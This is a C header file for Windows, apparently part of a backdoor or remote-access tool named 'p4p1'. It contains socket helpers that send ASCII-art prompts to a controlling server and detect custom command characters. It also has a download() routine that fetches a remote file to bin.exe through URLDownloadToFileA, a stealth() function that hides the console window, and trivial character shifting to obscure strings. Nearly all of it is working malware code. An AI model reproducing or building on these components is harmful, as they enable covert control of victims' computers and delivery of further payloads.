/*      _ _       _
 * _ __| | | _ __/ |
 * | '_ \_  _| '_\  |
 * | .__/ |_|| .__/_|
 * |_|       |_|
 *
 * Header file.
 *
 ******/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#define str(a) #a
#define xstr(a) str(a)
#define BUFSIZE 9999

typedef HRESULT (WINAPI *UDTF)(LPVOID, LPCTSTR, LPCTSTR, DWORD, LPVOID);

char wrecvsid(int sock, int size, int *br);
char incr(char ch);
char decr(char ch);
int iscommand(char buf);
int download(char * url);
int sendui(int s, char uin, int * bs);

/*
 * get buf and check if p4p1 custom command
 */
int iscommand(char buf)
{
	if(buf == '*'){
		return 1;
	} else if(buf == '&') {
		return 2;
	} else {
		return 0;
	}
}

/*Downloader func
 */

int download(char * url)
{
	char path[100] = "bin.exe";
	int r = 1;
	HMODULE hDll;
	UDTF URLDownloadToFile;


	if((hDll = LoadLibrary("urlmon"))) {
		if((URLDownloadToFile = (UDTF)GetProcAddress(hDll, "URLDownloadToFileA"))) {
			if(URLDownloadToFile(0, url, path, 0, 0) == 0)
				r = 0;
	}
		FreeLibrary(hDll);
	}

	return r;
}

/*
 * wrapper for recv the sessionid
 **/
char wrecvsid(int sock, int size, int *br)
{
	int pbr = *(int *)br;
	char buf[size];
	pbr = SOCKET_ERROR;
	while(pbr == SOCKET_ERROR){
		pbr = recv(sock, buf, size, 0);
			if(pbr == 0 || pbr == WSAECONNRESET){
				break;
			}

			if(pbr < 0){
				return -1;
			} else {
				return buf[0];
			}
	}

}

/*
 * Wrapper to send prompt
 */
int sendui(int s, char uin, int * bs)
{
	int pbs = *(int *)bs;
	char ui[95] = "       _ _       _\n  _ __| | | _ __/ |\n | '_ \\_  _| '_ \\ |\n | .__/ |_|| .__/_|\n |_|       |_|\n\0";
	char uivpn[146] = "      _ _       _\n _ __| | | _ __/ |_ ___ __ _ _\n| '_ \\_  _| '_ \\ \\ \\V / '_ \\ ' \\\n| .__/ |_|| .__/_|\\\\_/| .__/_||_|\n|_|       |_|        |_|    \n\0";

	if(uin == '0'){
		pbs = send(s, ui, sizeof(ui), 0);
	        if(pbs == SOCKET_ERROR) { //server disconnected!
	        	if(WSAGetLastError() != WSAECONNREFUSED
	                || WSAGetLastError() == WSAECONNRESET){
	                	return 1;
	                } else {
	       	                return 1;
	                }
		}
	}

	if(uin == '1'){
		pbs = send(s, uivpn, sizeof(uivpn), 0);
                if(pbs == SOCKET_ERROR) { //server disconnected!
                        if(WSAGetLastError() != WSAECONNREFUSED
                        || WSAGetLastError() == WSAECONNRESET){
                                return 1;
                        } else {
                                return 1;
                        }
                }
	}


	return 0;
}

void stealth()
{
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

/*
 *Verry simple crypo to hide some stuff
 **/
char incr(char ch)
{
	return ch+1;
}

char decr(char ch)
{
	return ch-1;
}
